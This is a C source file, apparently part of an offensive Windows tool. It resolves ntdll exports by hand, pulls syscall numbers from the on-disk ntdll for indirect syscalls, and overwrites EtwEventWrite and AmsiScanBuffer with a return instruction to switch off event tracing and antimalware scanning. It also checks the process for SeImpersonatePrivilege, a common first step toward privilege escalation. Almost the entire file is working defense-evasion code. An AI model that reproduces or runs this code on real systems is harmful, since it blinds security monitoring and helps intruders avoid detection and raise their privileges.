#include <Windows.h>
#include <stdarg.h>
#include "util.h"
DWORD g_ssn = 0;
PVOID g_syscall = NULL;

PVOID manual_procaddress(HMODULE mod_handle, const char* funcName) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mod_handle;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)mod_handle + dos->e_lfanew);
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    DWORD exportSize = nt->OptionalHeader.DataDirectory[0].Size;
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mod_handle + exportRVA);

    DWORD* names = (DWORD*)((BYTE*)mod_handle + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)mod_handle + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)mod_handle + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)mod_handle + names[i]);
        if (strcmp(name, funcName) == 0) {
            WORD  ordinal = ordinals[i];
            DWORD funcRVA = functions[ordinal];

            if (funcRVA >= exportRVA && funcRVA < exportRVA + exportSize) {
                char* forwardStr = (char*)((BYTE*)mod_handle + funcRVA);
                char fwdDll[128] = { 0 };
                char fwdFunc[128] = { 0 };

                char* dot = strchr(forwardStr, '.');
                if (!dot) return NULL;

                size_t dllLen = dot - forwardStr;
                RtlCopyMemory(fwdDll, forwardStr, dllLen);
                if (dllLen + 4 < sizeof(fwdDll)) {
                    fwdDll[dllLen] = '.';
                    fwdDll[dllLen + 1] = 'd';
                    fwdDll[dllLen + 2] = 'l';
                    fwdDll[dllLen + 3] = 'l';
                    fwdDll[dllLen + 4] = '\0';
                }

                size_t funcLen = strlen(dot + 1);
                if (funcLen < sizeof(fwdFunc)) {
                    RtlCopyMemory(fwdFunc, dot + 1, funcLen + 1);
                }

                HMODULE fwdMod = LoadLibraryA(fwdDll);
                if (!fwdMod) return NULL;
                return manual_procaddress(fwdMod, fwdFunc);
            }

            return (PVOID)((BYTE*)mod_handle + funcRVA);
        }
    }
    return NULL;
}
DWORD getSSN(char* funcName) {
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    PVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pDisk) { CloseHandle(hMap); CloseHandle(hFile); return 0; }

    PVOID fn = manual_procaddress((HMODULE)pDisk, funcName);
    DWORD ssn = 0;
    if (fn) ssn = *(DWORD*)((BYTE*)fn + 4);

    UnmapViewOfFile(pDisk);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ssn;
}

PVOID getSyscallAddr(char* funcName) {
    HMODULE hMem = GetModuleHandleW(L"ntdll.dll");
    PVOID fn = manual_procaddress(hMem, funcName);
    if (!fn) return NULL;
    BYTE* p = (BYTE*)fn;
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i + 1] == 0x05)
            return (PVOID)&p[i];
    }
    return NULL;
}


BOOL EtwPatch() {
    g_ssn = getSSN("NtProtectVirtualMemory");
    g_syscall = getSyscallAddr("NtProtectVirtualMemory");

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;

    PVOID pEtwAddr = manual_procaddress(hNtdll, "EtwEventWrite");
    if (!pEtwAddr) return 0;

    SIZE_T region = 1;
    ULONG old = 0;
    if (!iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, PAGE_EXECUTE_READWRITE, &old)) {
        *(BYTE*)pEtwAddr = 0xC3;
        iNtProtectVirtualMemory(GetCurrentProcess(), &pEtwAddr, &region, old, &old);
        FlushInstructionCache(GetCurrentProcess(), pEtwAddr, 1);
        printf("[x] ETW Patched!\n");
        return 1;
    }
    return 0;
}

BOOL AmsiPatch() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) {
        printf("[x] AMSI not loaded\n");
        return 1;  // silent skip
    }
    PVOID pAddr = manual_procaddress(hAmsi, "AmsiScanBuffer");
    if (!pAddr) return 0;

    DWORD old = 0;
    if (iNtProtectVirtualMemory(GetCurrentProcess(), pAddr, 1, PAGE_EXECUTE_READWRITE, &old)) {
        *(BYTE*)pAddr = 0xC3;
        iNtProtectVirtualMemory(GetCurrentProcess(),pAddr, 1, old, &old);
        FlushInstructionCache(GetCurrentProcess(), pAddr, 1);
        printf("[x] AMSI Patched!\n");
        return 1;
    }
    return 0;
}

BOOL check_seimpersonate() {


    TOKEN_PRIVILEGES* ptp = { 0 };
    DWORD dwLength = 0;

    GetTokenInformation(
        GetCurrentProcessToken(),
        TokenPrivileges,
        NULL,
        0,
        &dwLength
    );

    ptp = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY, dwLength);


    if (GetTokenInformation(
        GetCurrentProcessToken(),
        TokenPrivileges,
        ptp,
        dwLength,
        &dwLength
    ))

    {
        LUID seimpersonateLuid = { 0 };
        LookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &seimpersonateLuid);
        for (DWORD i = 0; i < ptp->PrivilegeCount; i++) {
            if (ptp->Privileges[i].Luid.LowPart == seimpersonateLuid.LowPart &&
                ptp->Privileges[i].Luid.HighPart == seimpersonateLuid.HighPart) {
                if (ptp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED || (ptp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)) {
                    printf("[x] SeImpersonatePrivilege\n");
                    HeapFree(GetProcessHeap(), 0, ptp);
                    return 1;
                }


            }
        }
    }
    printf("[-] ERROR: Missing SeImpersonatePrivilege!\n");
    HeapFree(GetProcessHeap(), 0, ptp);
    return 0;
}
